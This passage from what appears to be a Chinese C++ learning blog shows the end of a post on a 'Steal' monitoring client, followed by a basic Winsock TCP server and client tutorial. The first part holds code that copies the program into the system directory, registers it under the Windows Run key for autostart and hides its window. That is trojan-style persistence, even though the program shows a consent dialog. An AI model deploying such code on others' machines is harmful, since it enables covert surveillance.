class="comment">//key</span></span><br><span class="line"><span class="type">char</span> currenPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;<span class="comment">//路径</span></span><br><span class="line"><span class="type">char</span> systemPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;<span class="comment">//系统路径</span></span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">LPSTR FileNewName;</span><br><span class="line">LPSTR FileCurrentName;</span><br><span class="line">DWORD type = REG_SZ;</span><br><span class="line">DWORD size = MAX_PATH;</span><br><span class="line">LPCTSTR Rgspath = <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>;<span class="comment">//注册表自启动目录</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">GetSystemDirectory</span>(systemPath, size);</span><br><span class="line"><span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, currenPath, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//copy file</span></span><br><span class="line">FileCurrentName = currenPath;</span><br><span class="line">FileNewName = <span class="built_in">lstrcat</span>(systemPath, <span class="string">&quot;\\Steal.exe&quot;</span>);<span class="comment">//写入注册表这个程序的名称</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_finddata_t</span> Steal;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ret1 = %d\n&quot;</span>, ret);</span><br><span class="line"><span class="keyword">if</span> (_findfirst(FileNewName, &amp;Steal) != <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//已安装</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ret2 = %d\n&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ihow = <span class="built_in">MessageBox</span>(<span class="number">0</span>, </span><br><span class="line"><span class="string">&quot;该程序只允许用于合法的用途！\n 继续运行该程序将使得这台电脑处于被监控状态,\n 如果您不想这样，请点击\&#x27;取消\&#x27;按钮推出。\n 按下\&#x27;是\&#x27;则该程序将被复制到您的机器上 \</span></span><br><span class="line"><span class="string">\ 并随着系统启动自动运行。\n 按下\&#x27;否\&#x27;则程序只运行一次，不会再您的系统内留下任何东西。&quot;</span>, <span class="string">&quot;警告&quot;</span>, MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ihow == IDCANCEL)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ihow == IDNO)&#123;</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//则只运行一次</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//复制文件</span></span><br><span class="line">ret = <span class="built_in">CopyFile</span>(FileCurrentName, FileNewName, TRUE);</span><br><span class="line"><span class="keyword">if</span> (!ret)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加入注册表需要管理员打开，不然没权限无法写入</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">ret = <span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, Rgspath, <span class="number">0</span>, KEY_WRITE, &amp;hkey);</span><br><span class="line"><span class="keyword">if</span> (ret != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">RegCloseKey</span>(hkey);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Set Key</span></span><br><span class="line">ret = <span class="built_in">RegSetValueEx</span>(hkey, <span class="string">&quot;Steal&quot;</span>, <span class="literal">NULL</span>, type, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)FileNewName, size);</span><br><span class="line"><span class="keyword">if</span> (ret != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">RegCloseKey</span>(hkey);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最终仍需手动关闭</span></span><br><span class="line"><span class="built_in">RegCloseKey</span>(hkey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个写进注册表的真的是又臭又长。。。说白了还是不会用直接抄。</p><img src="/2022/07/16/winFiles/009.png" class=""><p>编译后记住要管理员启动才能到那一步，不然权限不够。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">HideMyself</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//首先拿到当前窗口的句柄</span></span><br><span class="line">HWND hwnd = <span class="built_in">GetForegroundWindow</span>();</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>隐藏就比较直接，通过获取当前窗口句柄，直接调用现成的隐藏掉。</p><img src="/2022/07/16/winFiles/010.png" class=""><p>可以看到先开服务器之后，客户端启用直接闪烁就隐藏了，连接的消息还是在持续发送的一个状态。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol><li>文件遍历，能够第一时间想起<code>WIN32_FIND_DATA</code>结构体</li><li><code>WIN32_FIND_DATA</code>包含了文件名和文件信息，创建时间，访问时间等</li><li>句柄——指针 用来表示windows下的一些对象</li><li>MAX_PATH 预定义的宏，260</li><li>禁用特定警告，比如没有使用_s的安全函数</li><li>隐藏窗口其实挺好记的，注册表这个要多用或者查查文档，感觉也没必要死记硬背</li></ol>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>socket</title>
      <link href="/2022/07/09/socket/"/>
      <url>/2022/07/09/socket/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓套接字(Socket)，就是对网络中不同主机上的应用进程之间进行双向通信的端点的抽象。一个套接字就是网络上进程通信的一端，提供了应用层进程利用网络协议交换数据的机制。从所处的地位来讲，套接字上联应用进程，下联网络协议栈，是应用程序通过网络协议进行通信的接口，是应用程序与网络协议栈进行交互的接口。<br>-百度说的</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>很好，百度说的太抽象看不懂。</p><hr><h2 id="c-x2F-s模式"><a href="#c-x2F-s模式" class="headerlink" title="c&#x2F;s模式"></a>c&#x2F;s模式</h2><p>就是客户端和服务端</p><ul><li>服务端<ul><li>首先服务器启动之后，根据请求提供相应的服务。</li><li>打开一个通信通道，在某一地址和端口上接受请求。</li><li>等待客户请求达到该端口</li><li>接收到重复服务请求，处理该请求并发送应答信号。</li><li>返回第二部，等待另一客户请求</li><li>关闭服务器。</li></ul></li><li>客户端<ul><li>打开一个通信通道，并连接到服务器所在主机的特定端口。</li><li>向服务器发送服务请求，等待并接受应答；继续提出请求。</li><li>请求结束后关闭通信通道并终止。</li></ul></li></ul><p>常见端口，如http服务端口号为80，https为443等</p><hr><h2 id="ip地址和端口号"><a href="#ip地址和端口号" class="headerlink" title="ip地址和端口号"></a>ip地址和端口号</h2><p>win+r打开运行，输入cmd回车都是些基本操作了。</p><p>windows用<code>ipconfig</code><br>linux用<code>ifconfig</code><br>就能查看最基本的几个网卡的信息。</p><p>ip通常指的是网络协议，ip地址则是具体的表现。分为ipv4和ipv6。<br>端口则是为了区分创建的套接字而分配的序号，把IP地址看成房子，端口则是出入的门。<br>端口号可以有65536[即2^16]，其中0-1023一般被用作知名服务器的端口被预定，如www服务选择80端口，ftp服务选择21端口。</p><hr><h2 id="TCP-x2F-UDP"><a href="#TCP-x2F-UDP" class="headerlink" title="TCP&#x2F;UDP"></a>TCP&#x2F;UDP</h2><p>面向连接的套接字</p><ul><li>传输过程中数据不会丢失</li><li>按顺序传输数据</li><li>传输的过程不存在数据边界</li></ul><p>面向消息的套接字</p><ul><li>强调快速传输而非顺序</li><li>传输的数据可能丢失也可能损毁</li><li>限制每次传输数据的大小</li><li>传输的数据有数据边界</li></ul><blockquote><p>数据边界：比如要发送一百条消息，没有必要操心分几次传一次传多少。只要能到达就认为传输结束。</p></blockquote><p>tcp比较像进货，不会太在意量，反正最后都要卖。<br>udp则像快递，每个货物大小重量限制，派送的时候择优先送，路上丢快递也不稀奇。</p><hr><h2 id="网络编程的基本类型和函数"><a href="#网络编程的基本类型和函数" class="headerlink" title="网络编程的基本类型和函数"></a>网络编程的基本类型和函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SOCK_STREAM[流套接字] <span class="comment">//TCP 面向连接、可靠的数据传输，适合传输大量的数据，不支持广播、多播</span></span><br><span class="line">SOCK_DGRAM[数据包套接字]  <span class="comment">//UDP 无连接 支持广播、多播</span></span><br><span class="line">SOCK_RAM[原始套接字]  <span class="comment">//可以读写内核没有处理的ip数据报，避开TCP/IP处理机制，被传送的数据包可以直接传送需要它的应用程序</span></span><br></pre></td></tr></table></figure><ul><li>引用头文件winsock2.h</li><li>导入ws2_32.lib库</li><li>window下socket变成都要先进行Winsock的初始化</li></ul><img src="/2022/07/09/socket/000.png" class=""><table><thead><tr><th>函数名称</th><th>功能描述</th><th>适用范围</th></tr></thead><tbody><tr><td>socket</td><td>创建套接字</td><td>面向连接的传输+面向无连接的传输</td></tr><tr><td>bind</td><td>套接字与本地ip地址和端口号的绑定</td><td>面向连接的传输+面向无连接的传输</td></tr><tr><td>connect</td><td>请求连接</td><td>面向连接的传输的客户机进程</td></tr><tr><td>listen</td><td>侦听连接请求</td><td>面向连接的传输的服务器进程</td></tr><tr><td>accept</td><td>接受连接请求</td><td>面向连接的传输的服务器进程</td></tr><tr><td>send</td><td>往已建立连接的套接字上发送数据</td><td>面向连接的传输</td></tr><tr><td>recv</td><td>从已建立连接的套接字上接收数据</td><td>面向连接的传输</td></tr><tr><td>sendto</td><td>在无连接的套接字上发送数据</td><td>主要用于无连接的传输</td></tr><tr><td>recvfrom</td><td>在无连接的套接字上接收数据</td><td>主要用于无连接的传输</td></tr><tr><td>close</td><td>关闭套接字</td><td>面向连接的传输+面向无连接的传输</td></tr></tbody></table><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">sockaddr</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (_WIN32_WINNT &lt; 0x0600)</span></span><br><span class="line">    u_short sa_family;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    ADDRESS_FAMILY sa_family;           <span class="comment">// Address family.</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//(_WIN32_WINNT &lt; 0x0600)</span></span></span><br><span class="line"></span><br><span class="line">    CHAR sa_data[<span class="number">14</span>];                   <span class="comment">// Up to 14 bytes of direct address.</span></span><br><span class="line">&#125; SOCKADDR, *PSOCKADDR, FAR *LPSOCKADDR;</span><br></pre></td></tr></table></figure><p>对于sockaddr而言其实就俩成员，<br>一个无符号的短整型，也就是16位的地址类型<br>另一个14个char类型的数据，应该是ip+port</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span>(_WIN32_WINNT &lt; 0x0600)</span></span><br><span class="line">    <span class="type">short</span>   sin_family;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">//(_WIN32_WINNT &lt; 0x0600)</span></span></span><br><span class="line">    ADDRESS_FAMILY sin_family;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//(_WIN32_WINNT &lt; 0x0600)</span></span></span><br><span class="line"></span><br><span class="line">    USHORT sin_port;</span><br><span class="line">    IN_ADDR sin_addr;</span><br><span class="line">    CHAR sin_zero[<span class="number">8</span>];</span><br><span class="line">&#125; SOCKADDR_IN, *PSOCKADDR_IN;</span><br></pre></td></tr></table></figure><p>sockaddr_in在基础上多了一些。<br>16位的地址类型<br>16位的端口号<br>32位的ip地址<br>8字节填充</p><p><strong>前者是给操作系统用，因为他把ip和地址混合了，而后者是做了区分。</strong></p><p>对于没有引用头文件的时候想要查看定义就可以从文档下手，已知头文件的话就可以直接跳转到定义。</p><hr><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><h3 id="简易服务器"><a href="#简易服务器" class="headerlink" title="简易服务器"></a>简易服务器</h3><img src="/2022/07/09/socket/001.png" class=""><p>模型上都差不多的路数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TCP Server!\n&quot;</span>);</span><br><span class="line"><span class="comment">//#ifdef 0</span></span><br><span class="line"><span class="comment">//*初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);     <span class="comment">//用winsock2头文件就写2</span></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//#endif // 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSer, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span>(SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;listen errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKADDR_IN addCli;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="comment">//分出子对象处理请求</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start\n&quot;</span>);<span class="comment">//测试运行到哪</span></span><br><span class="line">SOCKET sockConn = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addCli, &amp;len);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);<span class="comment">//测试运行到哪</span></span><br><span class="line"><span class="type">char</span> sendBUf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//sprintf_s(sendBUf, 100, &quot;Welcome %s to China!&quot;, inet_ntoa(addCli.sin_addr));</span></span><br><span class="line"><span class="built_in">sprintf_s</span>(sendBUf, <span class="number">100</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="comment">//收发数据</span></span><br><span class="line"><span class="type">int</span> iLen = <span class="built_in">send</span>(sockConn, sendBUf, <span class="built_in">strlen</span>(sendBUf),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">iLen = <span class="built_in">recv</span>(sockConn, recvBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recvBuf: %s&quot;</span>, recvBuf);</span><br><span class="line"><span class="comment">//关闭子对象</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockConn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务结束关闭</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockSer);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="简易客户端"><a href="#简易客户端" class="headerlink" title="简易客户端"></a>简易客户端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TCP Client\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//*初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置要连接的服务器</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;192.168.10.102&quot;</span>);<span class="comment">//本机ip地址测试</span></span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//收发数据，对比服务器，客户端应是先收后发</span></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> iLen = <span class="built_in">recv</span>(sockCli, recvBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recvBuf = %s\n&quot;</span>, recvBuf);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> sendBuf[<span class="number">100</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">iLen = <span class="built_in">send</span>(sockCli, (<span class="type">char</span>*)sendBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockCli);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本质上其实跟服务器差不多，像初始化网络库就肯定要套用的。</p><p>然后先回到之前服务器的debug目录右击管理员打开<br>然后vs debug跑现在的服务器</p><img src="/2022/07/09/socket/003.png" class=""><p>发现有回应了。</p><img src="/2022/07/09/socket/004.png" class=""><img src="/2022/07/09/socket/005.png" class=""><p>如果出现这些问题，需要注意服务器是否启动，或者客户端设置的服务器ip地址是否正确，如果套在本地虚拟网卡上，这个网卡又正好没启动也是无响应的状态。建议就直接配在连接的有线网卡或者无线网卡ip。</p><hr><p>修改之前服务器连接的时候发送的消息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="comment">//分出子对象处理请求</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start\n&quot;</span>);<span class="comment">//测试运行到哪</span></span><br><span class="line">    SOCKET sockConn = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addCli, &amp;len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);<span class="comment">//测试运行到哪</span></span><br><span class="line">    <span class="type">char</span> sendBUf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">sprintf_s</span>(sendBUf, <span class="number">100</span>, <span class="string">&quot;Welcome %s to China!&quot;</span>, <span class="built_in">inet_ntoa</span>(addCli.sin_addr));</span><br><span class="line">    <span class="comment">//sprintf_s(sendBUf, 100, &quot;hello&quot;);</span></span><br><span class="line">    <span class="comment">//收发数据</span></span><br><span class="line">    <span class="type">int</span> 